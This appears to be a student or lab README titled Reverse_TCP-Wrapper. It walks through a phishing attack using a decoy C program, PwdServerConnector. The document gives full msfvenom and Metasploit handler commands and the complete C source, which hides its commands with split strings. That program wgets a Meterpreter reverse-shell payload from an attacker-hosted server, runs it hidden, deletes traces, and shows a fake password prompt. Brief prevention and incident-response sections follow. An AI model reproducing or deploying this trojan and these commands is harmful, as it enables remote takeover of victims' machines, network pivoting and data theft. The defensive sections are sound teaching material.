# Reverse_TCP-Wrapper

## Situation
A malicious user, in this case, me, sends out this email to everyone, attached is the PwdServerConnector program.The interesting name will prompt many people to run the program, in hopes of getting sensitive information. In this case, if anyone does in fact run the program, it will install a simple reversetcp from a hosted server and run it, it will then give me, the attacker, access to the computer and by proxy, the network, allowing me pivot and attack the remaining computers in the network as well as steal private information.

---

## How
After hosting the malicious reverse tcp payload on the malicious computer, and sending out the PwdServerConnector program, the program, before running the original code will actually run a command to wget the reversetcp file, run it as a hidden process then remove the downloaded folder, removing traces of the existence of the file to prevent users from finding out the true intentions of the reversetcp file as it is possible to get more information on the file easily. The decoy program is then compiled in c so that it cannot be easily decompiled for analysis, to prevent users from seeing the text in the files, dummy text is put along with the legitimate command to confuse the user.

---

## Exploit
This exploit is used as a phishing exploit, exploiting the weakest link in the entire security chain, the user. Who upon seeing the email, may think it is an interesting file and be tempted to run it to see what happens.
Reversetcp in itself exploits the fact that firewalls do not tend to filter any outgoing connections, as it is not feasible to do so. This is because, computers constantly make outgoing connections with different ips, such as when browsing the web or accessing shared files. Therefore using a reversetcp exploit code, it is the exploited machine itself that’s initiating contact with the attacker, making it act as a server of sorts, instead of the other way round, resulting in the complete bypass of any firewall rules. This particular exploit is not restricted by the existence and version number of any programs as it is an executable file compiled in c.

---

## Prevention
As it is not feasible to put firewall rules stopping all outgoing connections, the next feasible plan would be to teach employees the danger of opening and running suspicious files and programs sent to them. Another thing that could be considered is to put up a firewall rule preventing all outgoing connections to port 4444, as it is a common port used by attackers to receive reversetcp connections. Although this can be easily bypassed if the attacker were to change their  listening port number, I believe this would be effective in preventing some attacks as it is possible that less experienced attackers may not be aware of this and see this as a failed attack.

---

## Incident response
In the case that this attack is suspected to have already been carried out on the victim computer, it is possible to check for a possible infection as well as remove the attack completely.
#### Check for infection
This can be done by,
1.	check for any connections to the port `4444`
```
netstat -tunap |grep 4444
```

#### Removal
This can be done by,
1.	checking the processes and greping anyone created under `.safe`
```
ps|grep .safe
```

2.	kill the process
```
kill -9 <PID>
```

## Attack Steps
1.	msfvenom to generate reversetcp payload
```
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST='10.10.4.199' LPORT="4444" -o reverse_shell
```
2.	msfconsole to handle any reverse tcp connections
``` bash
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload =>linux/x64/meterpreter_reverse_tcp
msf exploit(multi/handler) > set LHOST 10.10.4.199
msf exploit(multi/handler) > exploit
```
3.	Update k.c with the ip and port
``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <sys/time.h>
#include <termios.h>
#include <errno.h>   /* for errno */
#include <unistd.h>  /* for EINTR */

int getch() {
int ch;
for (;;) {
    struct termios oldtc, newtc;
    int ch;
    tcgetattr(STDIN_FILENO, &oldtc);
    newtc = oldtc;
    newtc.c_lflag &= ~(ICANON | ECHO);
    tcsetattr(STDIN_FILENO, TCSANOW, &newtc);
    ch=getchar();
    tcsetattr(STDIN_FILENO, TCSANOW, &oldtc);
    if(ch == '\n')
              break;
    }
return 0;
}

int main() {
char c[5]="wget";
char z[7]="touch";
char f[7]="chmod";
char t[4]="-r";
char y[3]="f";
char fff[8]="install";
char zz[2]=";";
char yyy[5]="yum";
char tt[3]="cd";
char u[10]="number";
char ss[7]=".safe";
char ip[18]="10.10.2.96:1234";
char ye[4]="777";
char cmd[80]="";
char r[3]="./";
char dd[2]="&";
char la[3]="rm";
sprintf(cmd,"%s %s %s 2>/dev/null%s%s %s%s%s %s %s%s%s%s %s",c,t,ip,zz,tt,ip,zz,f,ye,ss,zz,r,ss,dd);
char neww[20]="";
sprintf(neww,"%s%s %s%s %s",la,t,y,ip);
//printf("%s",cmd);
system(cmd);
system(neww);


char str[16],*endp;
int value;
printf("root@password_server's password:");
getch();
printf("\nPermission denied, please try again.");
printf("\nroot@password_server's password:");
getch();
printf("\nPermission denied, please try again.");
printf("\nroot@password_server's password:");
getch();
printf("\nPermission denied (publickey,password).\n");

return 0;
}
```

4.	c=Compile k.c to program called PwdServerConnector
``` bash
gcc k.c -o PwdServerConnector
```
5.	Host reversetcp on python simple http server
``` bash
mkdir safe
mv .safe safe
cd safe
python -m SimpleHTTPServer 1234
```
6.	Send out PwdServerConnector to people via email
 
7.	When they run the program, it will proceed to download and connect itself via reversetcp to the attacker machine.
8.	Exploit complete

